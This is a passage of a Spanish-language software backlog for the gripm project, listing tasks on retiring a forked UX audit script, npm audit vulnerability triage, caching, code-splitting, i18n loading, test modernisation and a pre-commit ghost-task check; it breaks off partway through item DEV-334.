El nucleo del fork es un parche de i18n en `stripExpressions` (lineas 473-536): preserva
`t('...')` / `i18n.t('...')` como token `__I18N_LABEL__` para que el 100% de etiquetas
`{t('...')}` de una app bilingue no disparen UX-010.

> [!IMPORTANT]
> **Ningun `playbook:sync` arregla esto solo.** `.playbook-lock.json` registra
> `scripts/audit-ux-code.cjs` en `customizations`, y `classifyLocalFile` evalua
> `if (wasCustomization) return 'customization'` **antes** de mirar hash conocido ni
> buscar provenance. El archivo queda protegido y sin actualizar pase lo que pase. El
> retiro exige sacarlo del lockfile y correr `--force` para ese archivo, que es el
> objetivo de este item.

La divergencia no es cosmética: el fork tiene el sistema de baselining completo
(`fingerprint`, multiplicidad, ERROR-nunca-absorbido) y los invariantes `ENV-001` y
`ENV-002`, ninguno de los cuales existe upstream todavía.

El riesgo del fork no es técnico sino de contrato: **`.agents/skills/` sí se sincroniza,
así que el skill documenta un comportamiento que el motor que corre no tiene.** Un
fork se salta por construcción el control que `validate-repo.mjs` upstream existe para
aplicar.

### Qué resuelve upstream

`@gripm/playbook` ya aterrizo las tres piezas:

1. **Rediseño de `buildUnits`** con anidamiento real y tres granularidades por unidad (`text`, `ownContent`, `scopeText`). Resuelve la causa raíz de UX-010: el segmentador viejo contaba `<` contra `>` como caracteres y no distinguía un self-closing de un elemento con hijos.
2. **Eliminación del `break` por archivo.** Resultó ser la causa del bug de `needsContent`: cortaba el recorrido antes del segundo caso, lo que hacía el fixture de 2 casos incomprobable.
3. **Baselining como capacidad del auditor**, con `fingerprint` idéntico al local.

### Decisión tomada con upstream

- `ENV-001` (gutter de scrollbar) **no se promueve**: ya está cubierto por el test 6.3 de `scripts/test-parser.js`, que lee `src/index.css` directamente y es independiente del fork. Solo hay que desacoplar los 4 asserts de 6.2 que sí dependen del archivo bifurcado.
- `ENV-002` (`truncate` en diálogo) queda en discusión upstream; se promueve a firma propia cuando lo decidan.
- **La Tarea 1 (dejar de preservar el archivo) NO está bloqueada por `ENV-002`.** Está bloqueada porque el auditor upstream no expone API, así que no hay forma de componer sin bifurcar. Upstream libera la extensión en **2.2.0**.
- **Mientras tanto: seguir bifurcado, con fecha de fin.**

### Riesgo de la migración

El baseline actual quedó construido sobre una señal no confiable: UX-010 tenía
~101 falsos positivos sobre 191 candidatos. Esas entradas están lockeadas y
`audit:ux` reporta 0, así que nadie las va a limpiar jamás.

**No se debe correr `--update-baseline` a ciegas sobre las 487 observaciones.** Eso
dejaría el gate verde con 101 supresiones falsas y congelaría el problema.

**Criterios de Aceptación:**
- [ ] #1 Registrar la fecha de fin del fork: quitar `scripts/audit-ux-code.cjs` de `customizations` en `.playbook-lock.json` y eliminar la nota que lo justifica. `@gripm/playbook@2.6.0` ya está publicado; el gate de espera superado
- [x] #2 Mover `scripts/audit-ux-baseline.json` a la raíz del proyecto (`./audit-ux-baseline.json`), que es donde upstream lo ancla vía `path.join(ROOT, BASELINE_NAME)`
- [x] #3 Agregar el script `audit:ux:baseline` a `package.json`; hoy no existe y la guía upstream lo invoca
- [ ] #4 Desacoplar los 4 asserts de la sección 6.2 de `scripts/test-parser.js` que dependen de la existencia de `ENV_GUTTER` y `auditEnvInvariants`, conservando 6.1 (UX-009 acotado a diálogos) y 6.3 (gutter leído del CSS)
- [ ] #5 Regenerar el baseline **con revisión manual de los hallazgos**, no con `--update-baseline` ciego: separar lo genuino de los falsos positivos de UX-010 antes de snapshotear
- [ ] #6 Confirmar que `ENV-002` (truncate en diálogo) queda promovido upstream o, si no, reimplementarlo localmente después del sync, con su opt-out `audit-ux:allow-ENV-002` y las dos supresiones de `FolderPickerModal.tsx`
- [ ] #7 Verificar que la contraparte de UX-010 en el motor nuevo reporte el conteo **real** de botones sin nombre accesible, y que ese número sea el que se use para cerrar AC #4 de DEV-173
- [ ] #8 `npm run audit:ux` en verde con exit 0, `npx tsc --noEmit` con 0 errores, `npm test` y `npm run backlog:check` con código 0
- [ ] #9 Sacar `scripts/audit-ux-code.cjs` de `customizations` en `.playbook-lock.json` y traer el motor upstream con `npm run playbook:sync -- --force`, dejando el archivo idéntico al playbook (`.playbook-lock.json` regenerado). El fix de `hasVisibleText` **ya existe upstream desde `v2.6.0`** (`stripExpressions(source, keep)` + `isTextExpression`, que distingue posición), así que no hay que tocar `gripm-playbook`: basta dejar de preservar el fork
- [ ] #10 Regresión en el motor con caso positivo **y** negativo: un botón con `<span>{t('x')}</span>` no se reporta, un botón sólo-icono sin nombre accesible sí se reporta, y un hijo condicional (`{cond && <span>texto</span>}`) **no** cuenta como etiqueta para no perder sensibilidad. Con el fix, `node scripts/audit-ux-code.cjs --strict` devuelve exit 0 con 0 warnings

---

#### [DEV-193] Decidir qué hacer con las 10 vulnerabilidades del toolchain de build
- **Prioridad**: `high` | **Tipo**: `chore`

`npm audit` reporta 10 vulnerabilidades (3 moderadas, 7 altas) en el árbol de dependencias:

```
DIRECTO   high      tailwindcss
DIRECTO   high      vite
  transito high     braces
  transito high     chokidar
  transito high     fast-glob
  transito high     micromatch
  transito moderate esbuild
  transito moderate postcss-nested
  transito moderate postcss-selector-parser
  transito high     source-map-js
```

Ninguna es de React ni del runtime. Todas son del toolchain de build.

### Por qué un consumidor ve esto

Porque las dependencias de build están en `dependencies` y no en `devDependencies`. Eso fue una decisión deliberada: DEV-113 documenta que npm omite `devDependencies` al instalar de forma global, y los binarios publicados fallaban con `Cannot find package 'vite'`. DEV-121 lo revirtió.

La consecuencia es que quien instala `gripm` global recibe el toolchain de build completo aunque no lo use.

### Cuál es el riesgo real

Verificado: **`bin/gripm.js` y `bin/gripm-mcp.js` no importan ningún paquete externo**, solo built-ins de Node (`fs`, `path`, `url`, `child_process`). El código vulnerable se instala pero nunca se ejecuta en el camino de runtime de un consumidor.

- **Consumidor que usa `gripm`**: riesgo práctico nulo. Instala paquetes que no ejecuta.
- **Desarrollador del repo**: riesgo moderado. Son el dev server y su cadena. El más concreto es `source-map-js`, un DoS de event loop al parsear un source map malicioso, que exige abrir un source map de terceros.

### Por qué no es un fix automático

`npm audit fix` sin `--force` cambia 1 paquete. Las 10 restantes exigen `--force`, que quiere instalar `tailwindcss@4` y `vite@8`: dos majors, con cambios de configuración y de API.

Esta tarea es una **decisión con trade-off**, no un bug con parche.

**Criterios de Aceptación:**
- [ ] #1 Está decidido y documentado si se actualizan vite y tailwindcss a las majors, o se aceptan los avisos con el riesgo Justificado por escrito
- [ ] #2 Si se actualizan: la pirámide completa pasa en macOS y en Linux, incluido `npm run test:linux`
- [ ] #3 Si se actualizan: `npm run build` produce un `dist/` funcional y `npm run publish:check` sigue en verde
- [ ] #4 Si se actualizan: el bundle publicado se compara contra el actual y el crecimiento se justifica en el release notes
- [ ] #5 Si se aceptan los avisos: queda escrito por qué el riesgo no alcanza al runtime del consumidor, con la evidencia de que los binarios solo importan built-ins
- [ ] #6 El aviso no vuelve a sorprender en el `npm ci` de quien integra el repo: queda registrado en el README o en CONTRIBUTING qué esperar

---

#### [DEV-225] Extensión Webview para VS Code y Cursor con sincronización en tiempo real
- **Prioridad**: `medium` | **Tipo**: `feature`

Eliminar la fricción de alternar ventanas hacia el navegador para supervisar el backlog, empaquetando la interfaz React existente de Gripm dentro de una vista de panel lateral (Webview) para VS Code y Cursor:
1. **Extensión empaquetada:** Crear una extensión ligera que registre una vista lateral (`WebviewViewProvider`) en el contenedor de vistas del explorador o barra de actividad de VS Code / Cursor.
2. **Consumo de workspace activo:** Cargar la aplicación web de Gripm dentro del Webview alimentándose directamente de los archivos de backlog (`backlog/tasks/*.md` o `.gripm/backlog.json`) del workspace abierto.
3. **Sincronización bidireccional reactiva:** Detectar eventos de modificación en disco mediante watchers del editor para que los cambios aplicados por el agente (vía MCP) o por el usuario se reflejen inmediatamente en la vista sin necesidad de recargar manualmente.

**Criterios de Aceptación:**
- [ ] #1 Extension funcional empaquetada que registra una vista lateral en el explorador del editor
- [ ] #2 Carga de la aplicacion web de Gripm dentro del Webview consumiendo los archivos locales del workspace abierto
- [ ] #3 Sincronizacion bidireccional inmediata ante cambios en disco sin recargar manualmente
- [ ] #4 npm test y npx tsc --noEmit pasan con codigo 0

---

#### [DEV-226] Aislamiento multi-agente con Git Worktrees y bloqueos atómicos en disco
- **Prioridad**: `medium` | **Tipo**: `feature`

Permitir que múltiples sesiones de agentes (o un agente y el desarrollador) trabajen en paralelo sobre distintas tareas sin pisarse el directorio de trabajo ni generar inconsistencias en los archivos de backlog:
1. **Comandos de aislamiento en CLI y MCP:** Incorporar comandos para inicializar y aislar una tarea en un nuevo Git Worktree (`gripm worktree create <TASK-ID>`), creando una carpeta aislada en `.gripm/worktrees/<TASK-ID>` y una rama dedicada `feature/<TASK-ID>`.
2. **Mecanismo de bloqueo atómico (File Locks):** Implementar bloqueos en disco con timeout para prevenir condiciones de carrera cuando dos procesos o agentes intenten mutar tareas o regenerar el backlog simultáneamente.
3. **Reintegración y limpieza:** Comando `gripm worktree finish <TASK-ID>` para sincronizar el estado, reintegrar la rama y limpiar el worktree temporal asegurando que la tarea quede en estado `ready`.

**Criterios de Aceptación:**
- [ ] #1 Comando CLI gripm worktree create <TASK-ID> para inicializar y aislar una tarea en un nuevo worktree
- [ ] #2 Mecanismo de bloqueo (file lock) en disco que previene condiciones de carrera en mutaciones simultaneas
- [ ] #3 Comando para sincronizar y reintegrar la rama del worktree una vez finalizada la tarea
- [ ] #4 npm test y npx tsc --noEmit pasan con codigo 0

---

#### [DEV-263] Registro del pipeline de despliegue de la demo web: qué es manual y por qué
- **Prioridad**: `low` | **Tipo**: `chore`

La demo web de DEV-222 está publicada en `https://gripm.vercel.app` y el despliegue es
**deliberadamente manual**: `vercel deploy --prod` desde una máquina con la sesión iniciada.

> [!IMPORTANT]
> **El deploy manual es la decisión, no la deuda.** Se evaluó conectar el repositorio de
> GitHub a Vercel para obtener auto-deploy, y se descartó: en este proyecto los releases
> son decisiones deliberadas, y conectar el repo implica que cualquier push a `main` sale
> vivo sin revisión. Eso es **menos** control, no más.

Este ítem queda como **registro del estado real** del pipeline y de las dos acciones
menores que sí quedan abiertas. No es urgente.

**Criterios de Aceptación:**
- [ ] #1 Documentado en `CONTRIBUTING.md` que el despliegue de la demo es manual, con el comando exacto y la precondition de tener sesión iniciada en Vercel
- [ ] #2 Documentado en `CONTRIBUTING.md` que un cambio en `main` **no** llega a la demo por sí solo, y quién decide cuándo redesplegar
- [ ] #3 Registrado que `gripm.vercel.app` es la URL de producción del proyecto, no un alias, con la evidencia del `productionUrl` devuelto por el deploy
- [ ] #4 La divergencia de Node entre CI y producción está registrada como ítem propio en DEV-141, o resuelta ahí

---

#### [DEV-265] Selector de formato dual: inspeccionar una tarea como Markdown y como JSON desde la UI
- **Prioridad**: `medium` | **Tipo**: `improvement`

Salió de DEV-222 con decisión del PO: **es un afordance de pitch, no parte del entregable
de la sandbox.** El objetivo de DEV-222 era que la app funcione sin daemon; esto es que la
demo comunique mejor. Atarlos al mismo criterio de cierre mezclaba dos objetivos de
naturaleza distinta.

**Criterios de Aceptación:**
- [ ] #1 El panel muestra las dos representaciones de la tarea abierta: el Markdown con frontmatter y el JSON, generadas por `serializeBacklogMd()` y por el shape de `BacklogItem`, sin reimplementar ninguno de los dos
- [ ] #2 El Markdown mostrado es exactamente el que se escribiría en `backlog/tasks/<CODE> - <slug>.md`, incluido el nombre de archivo que `generateTaskFilename()` produciría
- [ ] #3 El contenido mostrado se **copia al portapapeles** completo, sin perder acentos ni saltos de línea del frontmatter
- [ ] #4 El afordance **solo aparece en modo sandbox**, con `isSandboxMode()`. En la app local con daemon no se ofrece, porque el dato real ya está en disco y el inspector sería ruido
- [ ] #5 No introduce scroll horizontal ni desborde en el modal, verificado a 1366x768 y en ambos temas
- [ ] #6 Texto y atajos en ambos idiomas (`es.json` y `en.json`), sin literales sueltos
- [ ] #7 Cero hallazgos nuevos de `UX-010` o `UX-011`: los botones icon-only llevan nombre accesible y los tamaños usan la escala canónica
- [ ] #8 `npx tsc --noEmit` con 0 errores, `npm test` con 17/17, `npm run test:ui` en verde y `npm run backlog:check` con código 0

---

#### [DEV-283] Caché en memoria por mtime para lecturas de tareas en el backend storage
- **Prioridad**: `high` | **Tipo**: `tech_debt`

Optimización del rendimiento de I/O en disco en el servicio de almacenamiento del backend ([server/services/storage.ts](file:///c:/Users/Pablo/Proyectos/gripm/server/services/storage.ts)) para evitar la lectura y parseo redundante de cientos de archivos Markdown en cada solicitud.

### Problemas identificados:
1. **Lectura síncrona bloqueante masiva:** Cada petición a `/api/data` (al cargar el tablero, tras guardar tareas o al dispararse eventos SSE) ejecuta `loadProjectBacklog`, el cual itera síncronamente sobre todos los archivos `.md` de `backlog/tasks/` (278 archivos en proyectos medianos).
2. Para cada archivo realiza `fs.statSync`, `fs.readFileSync` y `parseBacklogMd` (análisis léxico de frontmatter y expresiones regulares), congelando el event loop de Node.js durante 50-150 ms en cada ciclo.
3. El 99% de las veces, los archivos en disco no han cambiado entre una solicitud y la siguiente.

### Solución propuesta:
- Implementar una estructura de caché en memoria (`Map<string, { mtimeMs: number, item: any }>`) indexada por la ruta absoluta del archivo de tarea.
- Al listar archivos en `loadProjectBacklog`, obtener únicamente el `stat` rápido del archivo: si `fileStat.mtimeMs` coincide con el valor en caché, reutilizar la tarea parseada en memoria sin llamar a `fs.readFileSync` ni `parseBacklogMd`.
- Invalidar o actualizar la entrada puntual en el caché cuando se realicen escrituras a través de las funciones de mutación (`saveBacklogMdItem`, `softDeleteBacklogMdItem`, `restoreBacklogMdItem`, `purgeBacklogMdItem`).
- Limpiar entradas obsoletas si se eliminan archivos de disco.

**Criterios de Aceptación:**
- [ ] #1 `loadProjectBacklog` en `storage.ts` utiliza un caché en memoria validado contra `fileStat.mtimeMs` para omitir lecturas de archivos sin modificaciones
- [ ] #2 Las operaciones de escritura y mutación (`saveBacklogMdItem`, `softDeleteBacklogMdItem`, etc.) actualizan o invalidan inmediatamente la entrada correspondiente del caché
- [ ] #3 Los cambios externos en disco (ej. ediciones manuales o cambios por agentes/git) se detectan automáticamente mediante la discrepancia de `mtimeMs`
- [ ] #4 El tiempo de respuesta de `/api/data` se reduce de más de 80ms a menos de 10ms en llamadas subsiguientes
- [ ] #5 La suite de pruebas y sincronización de backlog aprueban limpiamente (`npm test` y `npm run backlog:check`)

---

#### [DEV-284] Code-splitting y lazy loading de ItemModal, SprintView y modales secundarios
- **Prioridad**: `medium` | **Tipo**: `tech_debt`

Optimización del tamaño del bundle JavaScript inicial en Vite mediante la aplicación de `React.lazy()` y dynamic imports para vistas y modales pesados que no son requeridos en el primer renderizado del tablero Kanban.

### Problemas identificados:
1. **Bundle monolítico inicial:** El bundle de producción genera un archivo principal `dist/assets/index-*.js` de **647 kB minificado** (163 kB gzipped), activando advertencias de Vite (`(!) Some chunks are larger than 500 kB after minification`).
2. **Componentes gigantes en el chunk raíz:**
   - [`ItemModal.tsx`](file:///c:/Users/Pablo/Proyectos/gripm/src/components/ItemModal.tsx) (128 kB, 2.290 líneas) solo se requiere cuando el usuario abre una tarjeta.
   - [`SprintView.tsx`](file:///c:/Users/Pablo/Proyectos/gripm/src/components/SprintView.tsx) (88 kB, 1.690 líneas) solo se requiere si la pestaña `sprint` está activa.
   - Modales como `ImportWizardModal`, `PlanGuardModal`, `FolderPickerModal`, `KeyboardShortcutsModal` y `ProjectModal` están incluidos en el bundle principal.
3. El tiempo de descarga inicial, parseo y compilación del motor JavaScript en navegadores móviles o equipos de baja potencia se degrada innecesariamente.

### Solución propuesta:
- Declarar `ItemModal` con `React.lazy()` envuelto en `Suspense` dentro de [src/App.tsx](file:///c:/Users/Pablo/Proyectos/gripm/src/App.tsx).
- Declarar `SprintView` con `React.lazy()` y Suspense, replicando el patrón ya utilizado para `SettingsView` y `ReleaseAssembler`.
- Cargar de forma diferida los modales secundarios de configuración o importación.
- Configurar `build.rollupOptions.output.manualChunks` en [vite.config.ts](file:///c:/Users/Pablo/Proyectos/gripm/vite.config.ts) para aislar chunks lógicos limpios (`react-vendor`, `icons-vendor`, etc.) si resulta beneficioso.

**Criterios de Aceptación:**
- [ ] #1 `ItemModal` y `SprintView` se cargan de forma dinámica mediante `React.lazy()` y `Suspense`
- [ ] #2 Los modales secundarios no bloquean la carga ni forman parte indivisible del bundle raíz
- [ ] #3 El tamaño del chunk JS principal generado por `npm run build` disminuye por debajo de 400 kB minificado
- [ ] #4 La interacción de apertura de tarjetas y navegación entre pestañas es fluida y sin parpadeos visuales
- [ ] #5 La suite de pruebas de UI y build (`npm test` y `npm run build`) pasan con código 0

---

#### [DEV-285] Carga diferida y asíncrona bajo demanda de diccionarios i18n
- **Prioridad**: `low` | **Tipo**: `tech_debt`

Optimización del sistema de internacionalización ([src/utils/i18n.tsx](file:///c:/Users/Pablo/Proyectos/gripm/src/utils/i18n.tsx)) para cargar únicamente el diccionario del idioma activo (`es.json` o `en.json`) en lugar de incluir ambos de forma estática en el paquete principal de la aplicación.

### Problemas identificados:
1. Actualmente `i18n.tsx` importa directamente ambos archivos JSON al inicio del archivo:
   ```ts
   import esDict from '../locales/es.json';
   import enDict from '../locales/en.json';
   ```
2. Esto suma más de **108 kB de datos JSON planos** al bundle inicial de JavaScript, a pesar de que el usuario solo puede usar un idioma a la vez.

### Solución propuesta:
- Modificar el proveedor `I18nProvider` para resolver dinámicamente mediante `import()` el archivo de idioma requerido según la preferencia del usuario o del sistema.
- Cargar inicialmente solo el idioma determinado por `getInitialLanguage()`.
- Si el usuario cambia de idioma en `SettingsView` o vía selector, cargar asíncronamente el nuevo diccionario y almacenarlo en caché en memoria.
- Mantener las firmas de tipado estricto `TranslationKey` usando `typeof` sobre una definición de tipo sin forzar la importación del contenido completo en tiempo de ejecución.

**Criterios de Aceptación:**
- [ ] #1 El bundle inicial no incluye los diccionarios de idiomas que no coincidan con el idioma activo
- [ ] #2 Al cambiar de idioma en configuración, el nuevo diccionario se carga bajo demanda de forma asíncrona sin errores
- [ ] #3 La función `t(...)` mantiene total compatibilidad hacia atrás y conserva el tipado estricto de TypeScript
- [ ] #4 `npx tsc --noEmit` y `npm test` pasan sin fallas

---

#### [DEV-286] Carga progresiva y optimización de layout containment en columnas masivas
- **Prioridad**: `low` | **Tipo**: `feature`

Mecanismo de carga progresiva y optimizaciones de renderizado de DOM para columnas del tablero Kanban que contengan un volumen muy elevado de tareas (ej. columnas `Draft` o `Done` con cientos de ítems acumulados).

### Problemas identificados:
1. Cuando una columna acumula más de 100 tarjetas (situación común en proyectos maduros o con historiales extensos), el navegador debe gestionar simultáneamente miles de nodos DOM, SVGs en línea y estilos computados en un contenedor desplazable.
2. Esto provoca que el scroll vertical de la columna o el drag-and-drop de tarjetas presente micro-tirones (jank de layout/reflow).

### Solución propuesta:
- Implementar renderizado progresivo por lotes (ej. renderizar las primeras 40-50 tarjetas y cargar las siguientes al hacer scroll o mediante botón "Cargar más tareas").
- Aplicar optimizaciones modernas de CSS en las tarjetas del Kanban: `contain-intrinsic-size` y `content-visibility: auto` (o `contain: content`) para que el motor del navegador omita los cálculos de pintura y layout de las tarjetas fuera del viewport visible.
- Preservar completamente la experiencia de arrastre (`Drag and Drop`) e indicadores visuales de drop target.

**Criterios de Aceptación:**
- [ ] #1 Las columnas con más de 50 tareas adoptan carga progresiva o contención de layout para evitar sobrecarga del DOM
- [ ] #2 El scroll en columnas densas se mantiene a 60 FPS estables sin bloqueos del hilo principal
- [ ] #3 La funcionalidad de arrastrar y soltar (drag & drop) y reordenamiento de tareas sigue operando con total precisión
- [ ] #4 Las pruebas unitarias y de integración (`npm test`) se ejecutan sin regresiones

---

#### [DEV-296] Modernización de Testing: Erradicación de test theater y eliminación de dependencia de Python
- **Prioridad**: `p3` | **Tipo**: `tech_debt`

Reemplazo gradual del arnés de pruebas casero (`18 subprocesos de Node en scripts/run-tests.js`) por un test runner estándar de la industria (Vitest), eliminando las aserciones por búsqueda de cadenas de texto sobre archivos `.tsx` y erradicando la dependencia de Python/PyYAML en el CI.

### Problemas identificados:

1. **Test Theater por Inspección de Texto ("String-Matching Testing"):**
   - En `scripts/verify-focus-trap.js:38-57`, para probar `useFocusTrap.ts`, lee el archivo con `fs.readFileSync` y hace `assert.ok(hook.includes("event.key !== 'Tab'"))`. Si se cambia el nombre de la variable o se comenta el código interno, el test da falsos positivos o falsos negativos.
   - En `scripts/test-ui-logic.js:89-117`, el stacking context se prueba leyendo clases de Tailwind en `Header.tsx` mediante regex.
   - En `scripts/verify-kanban-reorder.js:22-43`, se duplicó el código de reordenamiento en el archivo de test para probar su propia copia local.
2. **Dependencia Oculta de Python en Proyecto TypeScript:**
   En `scripts/verify-changes.js:77-98`, para validar YAML sin instalar un paquete de Node, el script busca `python3` y ejecuta `import yaml`. Esto obliga a todos los pipelines de GitHub Actions a instalar Python y correr `pip install pyyaml`.
3. **Contaminación del Repositorio por Tests:**
   `scripts/verify-mcp-binary.js:13-14` y `scripts/verify-resilience-and-cli.js:6-9` escriben archivos de prueba reales (`DEV-998`, `DEV-999`) dentro de `backlog/tasks/`, ensuciando el working tree del desarrollador si el test se cancela a la mitad.

### Estrategia de Modernización:
- Adoptar Vitest como test runner unificado con ejecución concurrente en memoria (reduciendo el tiempo de suite de 40s a ~3s).
- Reemplazar la validación de YAML de Python por un parser estándar de JavaScript.
- Aislar fixtures de prueba a `fs.mkdtempSync(path.join(os.tmpdir(), ...))`.

**Criterios de Aceptación:**
- [ ] #1 Se configura Vitest para la ejecución unificada de pruebas unitarias y de integración en memoria
- [ ] #2 Los tests de inspección de texto plano (`verify-focus-trap.js`, `test-ui-logic.js`) se reemplazan por aserciones de comportamiento reales
- [ ] #3 Se elimina la invocación a Python en `scripts/verify-changes.js`, utilizando un parser nativo de JavaScript para validar YAML
- [ ] #4 Los tests que crean archivos de prueba operan exclusivamente en directorios temporales (`os.tmpdir()`), sin ensuciar `backlog/tasks/`
- [ ] #5 La suite completa aprueba en CI sin requerir `setup-python` ni `pip install`

---

#### [DEV-297] Módulo Avanzado de Analytics: Diagrama de Flujo Acumulado (CFD), Histogramas de Ciclo y Predicción
- **Prioridad**: `low` | **Tipo**: `feature`

Extensión avanzada del módulo de analíticas (`DEV-229`) para incorporar herramientas predictivas e históricas profundas de ingeniería de software y gestión ágil:

1. **Diagrama de Flujo Acumulado (Cumulative Flow Diagram - CFD):**
   - Visualización del flujo de tareas en cada estado a lo largo de las semanas.
   - Detección visual de cuellos de botella (ensanchamiento de bandas de `review` o `doing`).
2. **Histograma de Cycle Time y Percentiles (P50, P85, P95):**
   - Gráfico de dispersión de tiempo de entrega por tarea.
   - Cálculo de percentiles para compromisos de entrega basados en evidencia real y no en estimaciones subjetivas.
3. **Simulación de Entrega (Forecasting Monte Carlo):**
   - Proyección de fechas estimadas de finalización de backlog o releases basada en la distribución real del throughput histórico.
4. **Filtros Temporales Dinámicos y Exportación:**
   - Selector de rango de fechas personalizado y exportación de reportes ejecutivos en formato Markdown y PDF.

**Criterios de Aceptación:**
- [ ] #1 Diagrama de Flujo Acumulado (CFD) interactivo con bandas de colores correspondientes a cada estado
- [ ] #2 Cálculo de percentiles de Cycle Time (P50, P85, P95) con gráfico de dispersión temporal
- [ ] #3 Módulo de simulación o proyección Monte Carlo para pronóstico de entregas por release
- [ ] #4 Filtro por rango de fechas flexible (último mes, trimestre, año o personalizado)
- [ ] #5 Exportación de reportes ejecutivos resumidos en Markdown
- [ ] #6 npm test y npx tsc --noEmit pasan con código 0

---

#### [DEV-313] Escalabilidad de I/O en disco: Cache incremental en memoria por mtime en BacklogService
- **Prioridad**: `medium` | **Tipo**: `enhancement`
**Criterios de Aceptación:**
- [ ] #1 Implementar un mapa de caché en memoria dentro de `BacklogService` que almacene la tarea parseada, su ruta y su `mtimeMs`.
- [ ] #2 En lecturas consecutivas sin cambios en disco, `getAllTasks` reutiliza los objetos cacheados sin invocar `fs.readFileSync` ni re-parsear YAML.
- [ ] #3 Si un archivo `.md` es modificado externamente (por el usuario o un editor), la caché detecta el cambio en `mtimeMs` e invalida/re-lee únicamente dicho archivo.
- [ ] #4 Si se eliminan archivos de `backlog/tasks/`, la caché remueve los ítems correspondientes.
- [ ] #5 Operaciones de mutación internas (`saveTask`, `deleteTask`) actualizan atómicamente la entrada en caché y la metadata en memoria.
- [ ] #6 Incorporar tests unitarios e integrados que certifiquen el comportamiento de la caché con archivos nuevos, modificados y eliminados.
- [ ] #7 La Pirámide de Verificación (`tsc --noEmit`, `npm test`, `npm run backlog:check`) pasa con 0 errores.

---

#### [DEV-315] Modularizacion de App.tsx en hooks de dominio y reduccion de deuda en audit-ux-baseline
- **Prioridad**: `medium` | **Tipo**: `refactor`
**Criterios de Aceptación:**
- [ ] #1 Extraer la lógica de fetching, mutación optimista y polling a hooks especializados en `src/hooks/` (e.g. `useBacklogData`).
- [ ] #2 Extraer la gestión de atajos de teclado y modales a hooks desacoplados.
- [ ] #3 Reducir la complejidad ciclomática y longitud de `src/App.tsx` a menos de 300 líneas.
- [ ] #4 Auditar y corregir las excepciones de UI listadas en `tests/audit-ux-baseline.json`.
- [ ] #5 Verificar que no se introducen regresiones funcionales ni visuales en la navegación, atajos ni modales.
- [ ] #6 La Pirámide de Verificación (`tsc --noEmit`, `npm test`, `npm run test:ui`) pasa con 0 errores.

---

#### [DEV-324] Corregir codePrefix GRIP por DEV en .gripm/config.json
- **Prioridad**: `high` | **Tipo**: `bug`

`.gripm/config.json` declara `"codePrefix": "GRIP"`, pero este repositorio usa el prefijo `DEV`. El bug ya causo un efecto observable: el CLI creo la tarea `GRIP-320` por error y hubo que renombrarla a `DEV-323`.

`codePrefix` no es decorativo. Lo leen dos caminos de creacion:

- `scripts/gripm-cli.js:920` lo usa para generar el ID de la tarea nueva.
- `src/lib/sandbox.ts:144` y `src/lib/sandbox.ts:372` lo usan como `project?.codePrefix ?? 'TASK'`.

Mientras el config declare `GRIP`, cualquier tarea creada desde la CLI o el sandbox de gripm sobre este repo vuelve a salir mal prefijada. Corregirlo es la mitigacion del defecto; la alternativa de proceso (escribir los IDs a mano) no arregla nada y deja la bomba armada.

Revisar de paso la inconsistencia relacionada en el mismo archivo: `defaultView: "sprint"` contra `enabledTabs.sprint: false`.

**Criterios de Aceptación:**
- [ ] #1 `.gripm/config.json` declara `"codePrefix": "DEV"`.
- [ ] #2 `npx tsc --noEmit` con 0 errores.
- [ ] #3 `npm test` con codigo 0.
- [ ] #4 `node scripts/verify-changes.js --all` con codigo 0.
- [ ] #5 No quedan tareas `GRIP-*` en `backlog/tasks/` ni referencias al prefijo `GRIP` como prefijo de este repo.

---

#### [DEV-333] El chequeo de fantasmas no distingue archivos stageados de archivos sin trackear en commits por pathspec
- **Prioridad**: `high` | **Tipo**: `bug`

`scripts/verify-backlog-sync.js:96-130` implementa el chequeo de tareas fantasma: si `BACKLOG.md` esta en el stage y referencia un archivo que git no trackea, el commit se rechaza. La deteccion recorre `git status --porcelain -z backlog/tasks/` y se queda solo con las entradas que empiezan por `?? `.

Esa condicion es correcta para un commit normal. **No lo es para un commit por pathspec.**

Cuando se ejecuta `git commit -m "..." -- <paths>`, git construye el commit a partir de HEAD **mas** los paths indicados, y el hook pre-commit corre contra ese indice temporal. Los archivos stageados en el indice principal que no estan en el pathspec aparecen ahi como `??` sin trackear, aunque en el indice real esten en `A `.

Resultado medido (2026-10-22): seis tareas stageadas (`A `, creadas por otro agente) y un commit selectivo de DEV-326 por pathspec. El guard las detecto como fantasmas y bloqueo un commit que era legitimo.

Peor aun, **las dos salidas que sugiere el error son incorrectas para ese caso**:

1. `git add <los 6 archivos>` - arrastra trabajo de otro agente al commit del agente en curso, violando la norma de "una tarea, un commit consolidado".
2. "Regenera BACKLOG.md sin esas tareas" - es imposible sin borrar los archivos de disco, que pertenecen a otro agente.

El agente quedo sin salida mecanica y tuvo que escalar la decision al PO. La unica resolucion real era incluir las tareas en el commit, y eso solo se sostiene invocando el precedente de `fa9a19a`.

El problema de fondo no es la deteccion: es que `BACKLOG.md` es un agregado que referencia **todas** las tareas del arbol, y por eso cualquier commit que lo incluya acopla al agente con todos los demás tareas pendientes. Ese acoplamiento ya le costo al repo una ocasion mas: el hook **antes** ejecutaba `git add BACKLOG.md backlog/`, que stageaba el directorio entero y arrastraba tareas ajenas. Se corrigio el indice (`verify-backlog-sync.js:367-372`) pero la politica de bloqueo reprodujo el mismo efecto por el lado opuesto. En ambos periodos, **commits selectivos imposibles**.

**Criterios de Aceptación:**
- [ ] #1 El chequeo distingue tres casos y reporta cada uno con su nombre: archivo `??` sin trackear (fantasma real), archivo `A ` stageado en el indice principal, y archivo presente en el arbol pero fuera del commit por pathspec.
- [ ] #2 El mensaje de error **no** sugiere `git add` de archivos que pertenecen a otro agente ni la regeneracion del consolidado sin ellos, porque ambas salidas son invalidas en el caso pathspec.
- [ ] #3 Ante un commit por pathspec que deja fuera archivos stageados, el error nombra explicitamente el pathspec como causa y ofrece las dos salidas reales: incluirlos, o commitearlos antes.
- [ ] #4 `node scripts/verify-integration.js` cubre el caso: un repositorio de prueba con una tarea stageada y un commit por pathspec que la excluye. El test debe demostrar que el mensaje correcto aparece.
- [ ] #5 El chequeo sigue rechazando el fantasma real: un archivo `??` referenciado por el consolidado bloquea el commit como hasta ahora.
- [ ] #6 `npm run backlog:check` y `node scripts/verify-changes.js --all` salen con codigo 0.

---

#### [DEV-334] DEV-025 tilda un AC que apunta a docs/DISTRIBUTION.md, un archivo que nunca existio
- **Prioridad**: `high` | **Tipo**: `bug`

Al regularizar la atribucion de los tres items en `done` que nunca entraron en `itemCodes` (DEV-025, DEV-026, DEV-179), el rastreo por artefacto mostro que el AC #2 de DEV-025 apunta a un archivo que jamas existio.

El criterio dice textualmente:

```
